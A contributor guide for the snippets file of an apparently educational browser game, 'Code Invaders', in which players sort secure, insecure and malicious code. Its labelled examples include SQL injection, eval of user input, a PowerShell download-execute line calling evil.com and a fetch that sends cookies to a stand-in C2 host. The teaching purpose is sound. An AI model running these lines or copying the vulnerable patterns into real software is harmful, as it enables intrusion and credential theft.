# Snippets Guide 📝

This guide explains how to add, edit, and manage code snippets for the Code Invaders game.

## Quick Start

All code snippets are stored in **`snippets.json`** - a simple JSON file that's easy to edit!

## File Format

```json
{
  "secure": [
    "code snippet 1",
    "code snippet 2"
  ],
  "insecure": [
    "vulnerable code 1",
    "vulnerable code 2"
  ],
  "malware": [
    "malicious pattern 1",
    "malicious pattern 2"
  ]
}
```

## Adding New Snippets

### Step 1: Open `snippets.json`

Use any text editor to open the file.

### Step 2: Add Your Snippet

Add a new string to the appropriate array. Use `\n` for newlines:

```json
{
  "insecure": [
    "query = \"SELECT * FROM users WHERE id=\" + userId",
    "eval(userInput)",
    "YOUR NEW SNIPPET HERE\nSECOND LINE IF NEEDED"
  ]
}
```

### Step 3: Save & Refresh

1. Save the file
2. Refresh your browser
3. Your new snippet will appear in the game!

**That's it!** No compilation, no build step needed.

## Best Practices

### ✅ DO

- **Keep snippets short** (1-3 lines max for readability)
- **Use realistic code** (actual vulnerability patterns)
- **Escape special characters** (`\"` for quotes, `\\` for backslashes)
- **Test your JSON** (use [jsonlint.com](https://jsonlint.com) if unsure)
- **Use clear examples** (make the vulnerability/security obvious)

### ❌ DON'T

- Don't make snippets too long (max 35 chars per line displayed)
- Don't forget to escape quotes inside strings
- Don't use tabs (use spaces or `\n` for newlines)
- Don't break the JSON format (commas between items!)

## Snippet Categories

### Secure Code (Green Blocks)

**What to include:**
- Parameterized queries
- Input validation
- Proper encoding/escaping
- Secure cryptographic functions
- Safe API usage

**Examples:**
```json
"PreparedStatement ps = conn.prepareStatement(\"SELECT * FROM users WHERE id=?\")",
"bcrypt.hash(password, 12)",
"const sanitized = validator.escape(userInput)"
```

### Insecure Code (Orange Blocks)

**What to include:**
- SQL injection vulnerabilities
- Command injection flaws
- XSS vulnerabilities
- Weak authentication
- Insecure configurations

**Examples:**
```json
"query = \"SELECT * FROM users WHERE id=\" + userId",
"eval(userInput)",
"os.system(\"rm -rf \" + userPath)"
```

### Malware (Red Blocks)

**What to include:**
- Obfuscated code patterns
- C2 beacon behaviors
- Suspicious network calls
- Base64/hex encoded payloads
- PowerShell download-execute patterns

**Examples:**
```json
"eval(atob(\"dmFyIGE9ZG9jdW1lbnQuY29va2ll\"))",
"IEX(New-Object Net.WebClient).DownloadString(\"http://evil.com/p.ps1\")",
"fetch(\"http://c2-server.evil/beacon?data=\" + btoa(document.cookie))"
```

## JSON Formatting Tips

### Multi-line Snippets

Use `\n` for line breaks:

```json
"stmt = conn.prepare(\"SELECT * FROM users WHERE id=?\")\nstmt.execute([userId])"
```

This displays as:
```
stmt = conn.prepare("SELECT * FROM users WHERE id=?")
stmt.execute([userId])
```

### Escaping Special Characters

- **Quotes:** `\"` 
- **Backslash:** `\\`
- **Newline:** `\n`
- **Tab:** `\t` (but use spaces instead)

**Example:**
```json
"const html = \"<div>\" + escape(input) + \"</div>\""
```

### Common Mistakes

❌ **Wrong:**
```json
{
  "secure": [
    "bcrypt.hash(password, 12)"    // Missing comma!
    "another snippet"
  ]
}
```

✅ **Correct:**
```json
{
  "secure": [
    "bcrypt.hash(password, 12)",
    "another snippet"
  ]
}
```

## Testing Your Changes

1. **Save** `snippets.json`
2. **Open browser console** (F12)
3. **Refresh** the game page
4. **Check console** for: `✓ Loaded snippets: { secure: X, insecure: Y, malware: Z }`
5. **Play** and verify your snippets appear!

## Example: Adding a New SQL Injection

**Before:**
```json
{
  "insecure": [
    "query = \"SELECT * FROM users WHERE id=\" + userId",
    "eval(userInput)"
  ]
}
```

**After:**
```json
{
  "insecure": [
    "query = \"SELECT * FROM users WHERE id=\" + userId",
    "eval(userInput)",
    "db.raw(\"UPDATE users SET role='admin' WHERE name='\" + name + \"'\")"
  ]
}
```

Save, refresh, done! ✓

## Display Limits

- **Font size:** 14px (large and readable!)
- **Block size:** 220x120 pixels
- **Max characters per line:** 35 (longer text is truncated with "...")
- **Max lines shown:** 5

If your snippet is longer, it will be automatically truncated with "..." at the end.

## Language Support

You can add snippets from **any programming language**:

- Python
- JavaScript/TypeScript
- PHP
- Java
- C/C++
- PowerShell
- Bash/Shell
- Ruby
- Go
- Rust
- ... any language!

Just make sure the vulnerability or security pattern is clear.

## Troubleshooting

### Snippets not loading?

1. Check browser console (F12) for errors
2. Validate JSON at [jsonlint.com](https://jsonlint.com)
3. Make sure `snippets.json` is in the same folder as `index.html`
4. Check for syntax errors (missing commas, unclosed quotes)

### Display issues?

- Keep lines under 35 characters
- Use `\n` to split long lines
- Test with shorter snippets first

### Game crashes?

- Validate your JSON syntax
- Remove any special unicode characters
- Check that all arrays have at least one snippet

---

## Quick Reference

| Action | How |
|--------|-----|
| Add snippet | Add string to appropriate array in `snippets.json` |
| Multi-line | Use `\n` between lines |
| Escape quotes | Use `\"` inside strings |
| Test changes | Save file → Refresh browser |
| Validate JSON | Use jsonlint.com |

---

**Happy snippet editing! Make the game your own! 🎮🔐**
